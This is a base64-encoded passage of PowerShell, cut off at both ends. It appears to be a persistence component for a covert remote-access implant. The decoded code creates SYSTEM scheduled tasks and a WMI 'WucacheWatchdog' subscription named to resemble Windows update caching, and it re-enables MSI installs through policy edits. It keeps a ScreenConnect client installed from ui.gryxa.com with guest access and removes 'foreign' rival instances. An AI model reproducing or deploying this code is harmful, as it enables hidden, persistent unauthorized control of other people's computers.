VmVyYm9zZUJsb2IgJHRuCiAgICAgICAgaWYgKC1ub3QgJGJsb2IpIHsgJGJsb2IgPSBHZXQtVGFz
a1ZlcmJvc2VCbG9iICgiXCR0biIpIH0KICAgICAgICBpZiAoJGJsb2IpIHsKICAgICAgICAgICAg
JG91cnNCcm9rZW4gPSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9tb25cLmNt
ZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAgICAgICAgICBpZiAoLW5vdCAkb3Vyc0Jy
b2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25Mb2cgInRhc2tzX3NraXBfZm9yZWlnbiAkdG4iOyBj
b250aW51ZSB9CiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQgJHRuCiAgICAgICAgICAgIFJl
bW92ZS1UYXNrUXVpZXQgKCJcJHRuIikKICAgICAgICB9CiAgICAgICAgIyBCdWlsZCBjbWRsaW5l
IGV4YWN0bHkgbGlrZSBvd24uY21kIGRldGFjaCAocHJvdmVuIHRvIHdvcmsgYXMgU1lTVEVNKS4K
ICAgICAgICAkcGFydHMgPSBAKAogICAgICAgICAgICAnL0NyZWF0ZScsICcvVE4nLCAkdG4sICcv
UlUnLCAnU1lTVEVNJywgJy9STCcsICdISUdIRVNUJywgJy9GJywKICAgICAgICAgICAgJy9UUics
ICRzcC5UciwgJy9TQycsICRzcC5TYwogICAgICAgICkKICAgICAgICBpZiAoJHNwLlNjIC1lcSAn
TUlOVVRFJykgewogICAgICAgICAgICAkcGFydHMgKz0gQCgnL01PJywgJHNwLk1vLCAnL1NUJywg
JHN0KQogICAgICAgIH0KICAgICAgICAkYXJnTGluZSA9ICgkcGFydHMgfCBGb3JFYWNoLU9iamVj
dCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ1tccyJdJykgeyAnInswfSInIC1mICgkXyAt
cmVwbGFjZSAnIicsICdcIicpIH0gZWxzZSB7ICRfIH0KICAgICAgICB9KSAtam9pbiAnICcKICAg
ICAgICAkY3JlYXRlVHh0ID0gY21kLmV4ZSAvYyAic2NodGFza3MuZXhlICRhcmdMaW5lIiAyPiYx
IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0KICAgICAgICAkY3JlYXRlSm9pbmVkID0gKCRjcmVh
dGVUeHQgLWpvaW4gJyAnKS5UcmltKCkKICAgICAgICBXcml0ZS1Pd25Mb2cgInRhc2tzX2NyZWF0
ZSAkKCRzcC5LZXkpICR0biA9PiAkY3JlYXRlSm9pbmVkIgogICAgICAgIGlmICgoVGVzdC1UYXNr
T3duc01vbiAkdG4gJHNwLk1hcmtlcikgLW9yIChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRz
cC5NYXJrZXIpKSB7CiAgICAgICAgICAgICRyZWFybWVkKysKICAgICAgICAgICAgaWYgKCRzcC5L
ZXkgLWVxICdUQVNLX0EnIC1vciAkc3AuS2V5IC1lcSAnVEFTS19CJykgewogICAgICAgICAgICAg
ICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9SdW4gL1ROIGAiJHRuYCIiIHwgT3V0LU51bGwK
ICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRmYWlsKysKICAgICAg
ICAgICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVhdGVfRkFJTCAkKCRzcC5LZXkpICR0biIKICAg
ICAgICB9CiAgICB9CiAgICByZXR1cm4gInRhc2tzIG9rPSRvayByZWFybWVkPSRyZWFybWVkIGZh
aWw9JGZhaWwiCn0KCmZ1bmN0aW9uIFJlbW92ZS1XYXRjaGRvZyB7CiAgICBmb3JlYWNoICgkY2xz
IGluIEAoJ19fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcnLCdfX0V2ZW50RmlsdGVyJywnQ29tbWFu
ZExpbmVFdmVudENvbnN1bWVyJywnX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24nKSkgewogICAg
ICAgIEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgJGNs
cyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVj
dCB7CiAgICAgICAgICAgICAgICAoJF8uTmFtZSAtZXEgJ1d1Y2FjaGVXYXRjaGRvZ0YnKSAtb3Ig
KCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dDJykgLW9yCiAgICAgICAgICAgICAgICAoJF8u
VGltZXJJZCAtZXEgJ1d1Y2FjaGVXYXRjaGRvZycpIC1vcgogICAgICAgICAgICAgICAgKCRfLkZp
bHRlciAtYW5kICRfLkZpbHRlci5Ub1N0cmluZygpIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nRion
KSAtb3IKICAgICAgICAgICAgICAgICgkXy5Db25zdW1lciAtYW5kICRfLkNvbnN1bWVyLlRvU3Ry
aW5nKCkgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicpCiAgICAgICAgICAgIH0gfCBGb3JFYWNo
LU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0LU51bGwgfQogICAgfQp9CgpmdW5jdGlvbiBJbnN0
YWxsLVdhdGNoZG9nIHsKICAgIGlmICgtbm90ICRNb25QYXRoKSB7IHJldHVybiAkZmFsc2UgfQog
ICAgUmVtb3ZlLVdhdGNoZG9nCiAgICAkb2sgPSAkdHJ1ZQogICAgdHJ5IHsKICAgICAgICBTZXQt
V21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19JbnRlcnZh
bFRpbWVySW5zdHJ1Y3Rpb24gYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IFRpbWVySWQgPSAn
V3VjYWNoZVdhdGNoZG9nJzsgSW50ZXJ2YWxNaWxsaXNlY29uZHMgPSAxODAwMDA7IFNraXBJZlBh
c3NlZCA9ICRmYWxzZSB9IHwgT3V0LU51bGwKICAgICAgICAkZiA9IFNldC1XbWlJbnN0YW5jZSAt
TmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0V2ZW50RmlsdGVyIGAKICAgICAg
ICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRjaGRvZ0YnOyBFdmVudE5hbWVz
cGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5ndWFnZSA9ICdXUUwnOwogICAgICAgICAgICAg
ICAgICAgICAgICAgIFF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gX19UaW1lckV2ZW50IFdIRVJFIFRp
bWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIH0KICAgICAgICAkYyA9IFNldC1XbWlJbnN0YW5jZSAt
TmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21tYW5kTGluZUV2ZW50Q29uc3Vt
ZXIgYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAnV3VjYWNoZVdhdGNoZG9nQyc7
IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4ZSAvYyBgIiRNb25QYXRoYCIiOyBSdW5JbnRl
cmFjdGl2ZWx5ID0gJGZhbHNlIH0KICAgICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSBy
b290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyBgCiAgICAg
ICAgICAgIC1Bcmd1bWVudHMgQHsgRmlsdGVyID0gJGY7IENvbnN1bWVyID0gJGMgfSB8IE91dC1O
dWxsCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KICAgIHJldHVybiAkb2sKfQoKZnVuY3Rp
b24gVGVzdC1XYXRjaGRvZ0dyYXBoIHsKICAgICR0ID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNl
IHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ludGVydmFsVGltZXJJbnN0cnVjdGlvbiAtRmls
dGVyICJUaW1lcklkPSdXdWNhY2hlV2F0Y2hkb2cnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZQogICAgJGYgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24g
LUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdhdGNoZG9nRiciIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAkYyA9IEdldC1XbWlPYmplY3QgLU5hbWVz
cGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIC1G
aWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZQogICAgJGIgPSAkbnVsbAogICAgaWYgKCRmIC1hbmQgJGMpIHsKICAgICAgICAkYiA9IEdl
dC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJU
b0NvbnN1bWVyQmluZGluZyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAg
ICAgIFdoZXJlLU9iamVjdCB7ICRfLkZpbHRlciAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJyAt
YW5kICRfLkNvbnN1bWVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nQyonIH0gfAogICAgICAgICAg
ICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICB9CiAgICByZXR1cm4gW2Jvb2xdKCR0IC1hbmQg
JGYgLWFuZCAkYyAtYW5kICRiKQp9CgpmdW5jdGlvbiBFbnN1cmUtV2F0Y2hkb2cgewogICAgaWYg
KFRlc3QtV2F0Y2hkb2dHcmFwaCkgeyByZXR1cm4gJ09LJyB9CiAgICBpZiAoLW5vdCAkTW9uUGF0
aCkgeyByZXR1cm4gJ01JU1NJTkcnIH0KICAgIGlmIChJbnN0YWxsLVdhdGNoZG9nKSB7IHJldHVy
biAnUkVBUk1FRCcgfQogICAgcmV0dXJuICdGQUlMJwp9CgojIENvcnJlY3QgMzItYml0ICsgNjQt
Yml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIgdXNlZCBhIHRydW5jYXRlZAojIFdPVzY0MzJO
b2RlIHBhdGggKG1pc3NpbmcgTWljcm9zb2Z0XFdpbmRvd3MpIHNvIEVWRVJZIDMyLWJpdCBTQyBw
cm9kdWN0CiMgd2FzIGludmlzaWJsZSB0byByZXBhaXIvZXh0ZXJtaW5hdGUvcmVnaXN0ZXJlZC4K
JHNjcmlwdDpVbmluc3RhbGxSb290cyA9IEAoCiAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0
XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJywKICAgICdIS0xNOlxTT0ZUV0FSRVxX
T1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwnCikK
CmZ1bmN0aW9uIFRlc3QtU0NSZWdpc3RlcmVkKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICAj
IEw4OiBORVZFUiB1c2UgcmV0dXJuIGluc2lkZSBGb3JFYWNoLU9iamVjdCAtIGl0IG9ubHkgZXhp
dHMgdGhlCiAgICAjIHBpcGVsaW5lIGl0ZXJhdGlvbiwgc28gdGhpcyBmdW5jdGlvbiBhbHdheXMg
ZmVsbCB0aHJvdWdoIHRvICdubycKICAgICMgYW5kIHRoZSBtb24gb3JwaGFuLWxhZGRlciBkZWxl
dGVkIGhlYWx0aHkgcmVnaXN0ZXJlZCBzZXJ2aWNlcy4KICAgIGlmICgtbm90ICRGaW5nZXJwcmlu
dCkgeyByZXR1cm4gJ25vJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZp
bmdlcnByaW50KSIKICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMp
IHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9CiAgICAg
ICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZSkpIHsKICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJGtl
eS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAg
ICAgICAgIGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5h
bWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAneWVzJyB9CiAgICAgICAgfQogICAgfQogICAgcmV0
dXJuICdubycKfQoKZnVuY3Rpb24gUmVwYWlyLVNDU2VydmljZShbc3RyaW5nXSRGaW5nZXJwcmlu
dCkgewogICAgIyBSZWNyZWF0ZXMgYSBkZWxldGVkIFNDIHNlcnZpY2UgZW50cnkgYnkgcmVwYWly
aW5nIHRoZSBSRUdJU1RFUkVEIHByb2R1Y3QuCiAgICAjIG1zaWV4ZWMgL2ZhIHtHVUlEfSByZXBh
aXJzIGluIHBsYWNlIC0gaXQgZG9lcyBOT1QgcnVuIHRoZSBTQy1mYW1pbHkKICAgICMgbWFqb3It
dXBncmFkZSByZW1vdmFsLCBzbyBvdGhlciBpbnN0YW5jZXMgYXJlIHVudG91Y2hlZC4KICAgICMg
TDU6IGFsc28gaGFuZGxlcyBwcmVzZW50LWJ1dC1TVE9QUEVEIHNlcnZpY2VzIChyZXBhaXIgcmVz
dG9yZXMgYmluYXJpZXMsCiAgICAjIHRoZW4gc3RhcnQpLiBPbmx5IGEgUnVubmluZyBzZXJ2aWNl
IGlzIGNvbnNpZGVyZWQgaGVhbHRoeS4KICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1
cm4gJ25vLWZwJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnBy
aW50KSIKICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5pbmcn
KSB7IHJldHVybiAnc3ZjLXJ1bm5pbmcnIH0KICAgICRndWlkID0gJG51bGwKICAgIGZvcmVhY2gg
KCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVz
dC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9CiAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0
LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAg
ICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgkZG4gLWFuZCAoJGRu
IC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpKSB7ICRndWlk
ID0gJGtleS5QU0NoaWxkTmFtZTsgYnJlYWsgfQogICAgICAgIH0KICAgICAgICBpZiAoJGd1aWQp
IHsgYnJlYWsgfQogICAgfQogICAgaWYgKC1ub3QgJGd1aWQpIHsgcmV0dXJuICdub3QtcmVnaXN0
ZXJlZCcgfQogICAgJiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNy
b3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL2YgMj4mMSB8IE91dC1OdWxs
CiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5k
b3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYxIHwg
T3V0LU51bGwKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgIm1zaV9yZXBhaXJfJEZpbmdl
cnByaW50LmxvZyIKICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRM
aXN0ICIvZmEgJGd1aWQgL3FuIC9ub3Jlc3RhcnQgL0wqdiBgIiRsb2dgIiIgLVdhaXQgLVBhc3NU
aHJ1CiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA4CiAgICAmIHNjLmV4ZSBjb25maWcgIiRuYW1l
IiBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwKICAgICYgc2MuZXhlIHN0YXJ0ICIkbmFtZSIg
Mj4mMSB8IE91dC1OdWxsCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA0CiAgICAkc3ZjID0gR2V0
LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIGlm
ICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gInN2Yy1yZXN0
b3JlZCBleGl0PSQoJHAuRXhpdENvZGUpIiB9CiAgICBpZiAoJHN2YykgeyByZXR1cm4gInN2Yy1z
dGlsbC1zdG9wcGVkIGV4aXQ9JCgkcC5FeGl0Q29kZSkiIH0KICAgIHJldHVybiAic3ZjLXN0aWxs
LW1pc3NpbmcgZXhpdD0kKCRwLkV4aXRDb2RlKSIKfQoKIyDilIDilIAgR3J5eGEgTVVTVC1SVU4g
aGVhbHRoIChMMTYpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAoj
IEwxNjogTkVWRVIgcmVpbnN0YWxsIHdoZW4gc2VydmljZSBpcyBSdW5uaW5nIChwYW5lbCBkdXBs
aWNhdGVzKS4KIyAgICAgIFRDUC9yZWxheSBhcmUgYWR2aXNvcnkgb25seS4gUmVpbnN0YWxsIG9u
bHk6IG1pc3Npbmcvc3RvcHBlZCBPUiBGUCBkcmlmdCBPUiAtRm9yY2UuCiMgTDE1OiBncnl4YS1o
ZWFsdGggLyBncnl4YS1lbnN1cmUg4oCUIDhoIGRlZXAgY2hlY2sgKFRDUC9yZWxheS9GUCBkcmlm
dCByZWluc3RhbGwpLgokc2NyaXB0OkdyeXhhRGVmYXVsdEZwID0gJzk5MDgxOThlNjY4ZTQ3NTAn
CiRzY3JpcHQ6R3J5eGFNc2lVcmwgPSAnaHR0cHM6Ly91aS5ncnl4YS5jb20vQmluL1NjcmVlbkNv
bm5lY3QuQ2xpZW50U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QnCiRzY3JpcHQ6R3J5eGFSZWxh
eUhvc3QgPSAndXBkYXRlLmdyeXhhLmNvbScKJHNjcmlwdDpHcnl4YVVpSG9zdCA9ICd1aS5ncnl4
YS5jb20nCiRzY3JpcHQ6U2V2cnpLZWVwID0gQCgnNWY2MDEwNTc5ODUyZTUwNycsICdmODYxYzgx
NDBkNDUzNDI3JykKCmZ1bmN0aW9uIEdldC1Hcnl4YUNmZ1BhdGggeyBKb2luLVBhdGggJFdvcmtE
aXIgJ2dyeXhhLmNmZycgfQoKZnVuY3Rpb24gR2V0LUdyeXhhRnAgewogICAgJGZwID0gJHNjcmlw
dDpHcnl4YURlZmF1bHRGcAogICAgJHAgPSBHZXQtR3J5eGFDZmdQYXRoCiAgICBpZiAoVGVzdC1Q
YXRoIC1MaXRlcmFsUGF0aCAkcCkgewogICAgICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAk
cCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAg
ICAgICAgaWYgKCRfIC1tYXRjaCAnXkNVUlJFTlRfRlA9KFswLTlhLWZBLUZdezE2fSlccyokJykg
eyAkZnAgPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQogICAgICAgIH0KICAgIH0KICAgIHJldHVy
biAkZnAKfQoKZnVuY3Rpb24gU2V0LUdyeXhhRnAoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAg
IGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gfQogICAgaWYgKC1ub3QgKFRlc3QtUGF0
aCAtTGl0ZXJhbFBhdGggJFdvcmtEaXIpKSB7CiAgICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERp
cmVjdG9yeSAtUGF0aCAkV29ya0RpciAtRm9yY2UgfCBPdXQtTnVsbAogICAgfQogICAgQCgKICAg
ICAgICAiQ1VSUkVOVF9GUD0kKCRGaW5nZXJwcmludC5Ub0xvd2VyKCkpIgogICAgICAgICJSRUxB
WT0kKCRzY3JpcHQ6R3J5eGFSZWxheUhvc3QpIgogICAgICAgICJVST0kKCRzY3JpcHQ6R3J5eGFV
aUhvc3QpIgogICAgICAgICJNU0lVUkw9JCgkc2NyaXB0OkdyeXhhTXNpVXJsKSIKICAgICAgICAi
VVBEQVRFRD0kKChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSkiCiAg
ICApIHwgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChHZXQtR3J5eGFDZmdQYXRoKSAtRW5jb2Rp
bmcgQVNDSUkgLUZvcmNlCn0KCmZ1bmN0aW9uIEdldC1LZWVwRmluZ2VycHJpbnRzIHsKICAgICRz
ZXQgPSBOZXctT2JqZWN0ICdTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5IYXNoU2V0W3N0cmlu
Z10nIChbU3RyaW5nQ29tcGFyZXJdOjpPcmRpbmFsSWdub3JlQ2FzZSkKICAgIFt2b2lkXSRzZXQu
QWRkKCc1ZjYwMTA1Nzk4NTJlNTA3JykKICAgIFt2b2lkXSRzZXQuQWRkKCdmODYxYzgxNDBkNDUz
NDI3JykKICAgIFt2b2lkXSRzZXQuQWRkKChHZXQtR3J5eGFGcCkpCiAgICAjIE80MTogYW55IGxp
dmUvc3RhcnRpbmcgbm9uLXNldnJ6IFNDIGlzIGEga2VlcGVyIChuZXZlciBleHRlcm1pbmF0ZSBh
cyBmb3JlaWduKQogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVl
bkNvbm5lY3QgQ2xpZW50KicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAg
ICAgaWYgKCRzdmMuU3RhdHVzIC1ub3RpbiBAKCdSdW5uaW5nJywgJ1N0YXJ0UGVuZGluZycsICdD
b250aW51ZVBlbmRpbmcnKSkgeyBjb250aW51ZSB9CiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0
Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsKICAgICAgICAgICAgJGZwID0gJG1hdGNoZXNbMV0u
VG9Mb3dlcigpCiAgICAgICAgICAgIGlmICgkZnAgLW5vdGluICRzY3JpcHQ6U2V2cnpLZWVwKSB7
CiAgICAgICAgICAgICAgICBbdm9pZF0kc2V0LkFkZCgkZnApCiAgICAgICAgICAgICAgICBTZXQt
R3J5eGFGcCAkZnAKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiBAKCRz
ZXQpCn0KCmZ1bmN0aW9uIFRlc3QtVGNwSG9zdFBvcnQoW3N0cmluZ10kSG9zdE5hbWUsIFtpbnRd
JFBvcnQgPSA0NDMsIFtpbnRdJFRpbWVvdXRNcyA9IDgwMDApIHsKICAgIGlmICgtbm90ICRIb3N0
TmFtZSkgeyByZXR1cm4gJGZhbHNlIH0KICAgICRjbGllbnQgPSAkbnVsbAogICAgdHJ5IHsKICAg
ICAgICAkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50CiAg
ICAgICAgJGlhciA9ICRjbGllbnQuQmVnaW5Db25uZWN0KCRIb3N0TmFtZSwgJFBvcnQsICRudWxs
LCAkbnVsbCkKICAgICAgICBpZiAoLW5vdCAkaWFyLkFzeW5jV2FpdEhhbmRsZS5XYWl0T25lKCRU
aW1lb3V0TXMsICRmYWxzZSkpIHsKICAgICAgICAgICAgdHJ5IHsgJGNsaWVudC5DbG9zZSgpIH0g
Y2F0Y2gge30KICAgICAgICAgICAgcmV0dXJuICRmYWxzZQogICAgICAgIH0KICAgICAgICAkY2xp
ZW50LkVuZENvbm5lY3QoJGlhcikKICAgICAgICByZXR1cm4gJHRydWUKICAgIH0gY2F0Y2ggewog
ICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0gZmluYWxseSB7CiAgICAgICAgaWYgKCRjbGllbnQp
IHsgdHJ5IHsgJGNsaWVudC5DbG9zZSgpIH0gY2F0Y2gge30gfQogICAgfQp9CgpmdW5jdGlvbiBH
ZXQtTXNpUHJvcGVydHkoW3N0cmluZ10kTXNpUGF0aCwgW3N0cmluZ10kUHJvcGVydHlOYW1lKSB7
CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkTXNpUGF0aCkpIHsgcmV0dXJu
ICRudWxsIH0KICAgIHRyeSB7CiAgICAgICAgJGluc3RhbGxlciA9IE5ldy1PYmplY3QgLUNvbU9i
amVjdCBXaW5kb3dzSW5zdGFsbGVyLkluc3RhbGxlcgogICAgICAgICRkYiA9ICRpbnN0YWxsZXIu
T3BlbkRhdGFiYXNlKChSZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRoICRNc2lQYXRoKS5QYXRoLCAw
KQogICAgICAgICR2aWV3ID0gJGRiLk9wZW5WaWV3KCJTRUxFQ1QgYFZhbHVlYCBGUk9NIGBQcm9w
ZXJ0eWAgV0hFUkUgYFByb3BlcnR5YD0nJFByb3BlcnR5TmFtZSciKQogICAgICAgICR2aWV3LkV4
ZWN1dGUoKSB8IE91dC1OdWxsCiAgICAgICAgJHJlYyA9ICR2aWV3LkZldGNoKCkKICAgICAgICBp
ZiAoLW5vdCAkcmVjKSB7IHJldHVybiAkbnVsbCB9CiAgICAgICAgcmV0dXJuIFtzdHJpbmddJHJl
Yy5TdHJpbmdEYXRhKDEpCiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gJG51bGwKICAgIH0K
fQoKZnVuY3Rpb24gR2V0LUZwRnJvbVByb2R1Y3ROYW1lKFtzdHJpbmddJFByb2R1Y3ROYW1lKSB7
CiAgICBpZiAoJFByb2R1Y3ROYW1lIC1tYXRjaCAnXCgoWzAtOWEtZkEtRl17MTZ9KVwpJykgeyBy
ZXR1cm4gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0KICAgIHJldHVybiAkbnVsbAp9CgpmdW5jdGlv
biBGaW5kLVByb2R1Y3RHdWlkKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICAkbmFtZSA9ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgIGZvcmVhY2ggKCRyb290IGlu
ICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRy
b290KSkgeyBjb250aW51ZSB9CiAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRl
bSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICAgICAgJGRu
ID0gKEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5h
bWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpKSB7CiAgICAgICAgICAgICAg
ICByZXR1cm4gJGtleS5QU0NoaWxkTmFtZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQog
ICAgcmV0dXJuICRudWxsCn0KCmZ1bmN0aW9uIFRlc3QtR3J5eGFSZWxheUNvbmZpZ3VyZWQoW3N0
cmluZ10kRmluZ2VycHJpbnQpIHsKICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgk
RmluZ2VycHJpbnQpIgogICAgJGRpcnMgPSBAKAogICAgICAgIChKb2luLVBhdGggJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIpLAog
ICAgICAgIChKb2luLVBhdGggJGVudjpQcm9ncmFtRmlsZXMgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
